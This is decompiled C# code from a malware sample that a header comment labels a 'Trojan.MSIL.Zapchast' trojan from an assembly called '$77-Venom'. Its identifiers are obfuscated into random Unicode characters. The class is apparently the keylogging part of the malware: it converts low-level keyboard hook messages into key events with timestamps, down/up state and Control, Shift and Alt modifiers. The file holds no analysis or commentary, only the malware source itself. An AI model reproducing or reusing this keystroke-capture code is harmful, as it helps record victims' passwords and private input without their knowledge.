// Decompiled with JetBrains decompiler
// Type: 흈蘱灊�ឪॷ⧤췄偐宽뇵㔳뢌貖歠
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class 흈蘱灊\uEBC4\uFFFDឪॷ\u29E4췄偐宽\uE6EE\uE191뇵㔳\uEBDE\uF7AB뢌貖歠 : KeyEventArgs
{
  public 흈蘱灊\uEBC4\uFFFDឪॷ\u29E4췄偐宽\uE6EE\uE191뇵㔳\uEBDE\uF7AB뢌貖歠(Keys keyData)
    : base(keyData)
  {
  }

  internal 흈蘱灊\uEBC4\uFFFDឪॷ\u29E4췄偐宽\uE6EE\uE191뇵㔳\uEBDE\uF7AB뢌貖歠(
    Keys keyData,
    int timestamp,
    bool isKeyDown,
    bool isKeyUp)
    : this(keyData)
  {
    this.Timestamp = timestamp;
    this.IsKeyDown = isKeyDown;
    this.IsKeyUp = isKeyUp;
  }

  public int Timestamp { get; private set; }

  public bool IsKeyDown { get; private set; }

  public bool IsKeyUp { get; private set; }

  internal static 흈蘱灊\uEBC4\uFFFDឪॷ\u29E4췄偐宽\uE6EE\uE191뇵㔳\uEBDE\uF7AB뢌貖歠 Ⲿ崎㖉\uE0CB畵ꨠ僩ᾑ貼㡬㩅\uFFFDഡ鉰\uE701葷㪽䣧雯喝(
    㹴벀쀙麚针핒\uFFFD脡䭒톌䞅龵䆫죶楎čꔌ崭㥕淓 data)
  {
    IntPtr wparam = data.WParam;
    IntPtr lparam = data.LParam;
    int tickCount = Environment.TickCount;
    int int64 = (int) (uint) lparam.ToInt64();
    bool flag1 = (int64 & 1073741824) != 0;
    bool flag2 = (int64 & int.MinValue) != 0;
    int keyData = (int) 흈蘱灊\uEBC4\uFFFDឪॷ\u29E4췄偐宽\uE6EE\uE191뇵㔳\uEBDE\uF7AB뢌貖歠.\uE963\uFFFD铐㵔\u1AA3璄䅕䖥牄褆䖜ᾪ堚\uF569\uE019\uF1E9衅ὄ酳\uFFFD((Keys) (int) wparam);
    bool flag3 = !flag1 && !flag2;
    bool flag4 = flag1 & flag2;
    int timestamp = tickCount;
    int num1 = flag3 ? 1 : 0;
    int num2 = flag4 ? 1 : 0;
    return new 흈蘱灊\uEBC4\uFFFDឪॷ\u29E4췄偐宽\uE6EE\uE191뇵㔳\uEBDE\uF7AB뢌貖歠((Keys) keyData, timestamp, num1 != 0, num2 != 0);
  }

  internal static 흈蘱灊\uEBC4\uFFFDឪॷ\u29E4췄偐宽\uE6EE\uE191뇵㔳\uEBDE\uF7AB뢌貖歠 㕰\uE236㺸ꍟ꧓\uF83Eﷱ鞷碑\uE053ⴝ㺶藕뷚\uFFFD흝뿽\uFFFDಘ傰(
    㹴벀쀙麚针핒\uFFFD脡䭒톌䞅龵䆫죶楎čꔌ崭㥕淓 data)
  {
    IntPtr wparam = data.WParam;
    ᑅ\uFFFD頙孌\uF33A搣\u1CCA\uFFFD\uF74C帒ᵍ\uE8BE醟\uFFFD旆ꗱ쉵\uEFBBᶛ䦺 structure = (ᑅ\uFFFD頙孌\uF33A搣\u1CCA\uFFFD\uF74C帒ᵍ\uE8BE醟\uFFFD旆ꗱ쉵\uEFBBᶛ䦺) Marshal.PtrToStructure(data.LParam, typeof (ᑅ\uFFFD頙孌\uF33A搣\u1CCA\uFFFD\uF74C帒ᵍ\uE8BE醟\uFFFD旆ꗱ쉵\uEFBBᶛ䦺));
    Keys keyData = 흈蘱灊\uEBC4\uFFFDឪॷ\u29E4췄偐宽\uE6EE\uE191뇵㔳\uEBDE\uF7AB뢌貖歠.\uE963\uFFFD铐㵔\u1AA3璄䅕䖥牄褆䖜ᾪ堚\uF569\uE019\uF1E9衅ὄ酳\uFFFD((Keys) structure.冏早乀禞蘐ⰰ泂ꕍ\u3294Ƿ쉆뵵諨룰嗚\u260C퉳絢ꚧ\uEADB);
    int num = (int) wparam;
    bool isKeyDown = num == 256 || num == 260;
    bool isKeyUp = num == 257 || num == 261;
    return new 흈蘱灊\uEBC4\uFFFDឪॷ\u29E4췄偐宽\uE6EE\uE191뇵㔳\uEBDE\uF7AB뢌貖歠(keyData, structure.岭ꮌꉕ䟴\uE1FA履窨ﰛ㙶㳂òᩡ㝧\u26C8ǹ\u1A8E롐珓\uA67E뵛, isKeyDown, isKeyUp);
  }

  private static bool 佅囗䜍땒ॽ躰\u28E6頩콟\u058C尾竷垃람\u2BA5憥ᱣ쳏ᶾ砄(int vKey) => ((int) 江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.먂\uE415銐걷햷뙩\uF379쓍틻㡁\uF0D5戦\uE42A鞇뚌偂쉙諾㕖ᾂ(vKey) & 32768) > 0;

  private static Keys \uE963\uFFFD铐㵔\u1AA3璄䅕䖥牄褆䖜ᾪ堚\uF569\uE019\uF1E9衅ὄ酳\uFFFD(Keys keyData)
  {
    bool flag1 = 흈蘱灊\uEBC4\uFFFDឪॷ\u29E4췄偐宽\uE6EE\uE191뇵㔳\uEBDE\uF7AB뢌貖歠.佅囗䜍땒ॽ躰\u28E6頩콟\u058C尾竷垃람\u2BA5憥ᱣ쳏ᶾ砄(17);
    bool flag2 = 흈蘱灊\uEBC4\uFFFDឪॷ\u29E4췄偐宽\uE6EE\uE191뇵㔳\uEBDE\uF7AB뢌貖歠.佅囗䜍땒ॽ躰\u28E6頩콟\u058C尾竷垃람\u2BA5憥ᱣ쳏ᶾ砄(16);
    bool flag3 = 흈蘱灊\uEBC4\uFFFDឪॷ\u29E4췄偐宽\uE6EE\uE191뇵㔳\uEBDE\uF7AB뢌貖歠.佅囗䜍땒ॽ躰\u28E6頩콟\u058C尾竷垃람\u2BA5憥ᱣ쳏ᶾ砄(18);
    return keyData | (flag1 ? Keys.Control : Keys.None) | (flag2 ? Keys.Shift : Keys.None) | (flag3 ? Keys.Alt : Keys.None);
  }
}
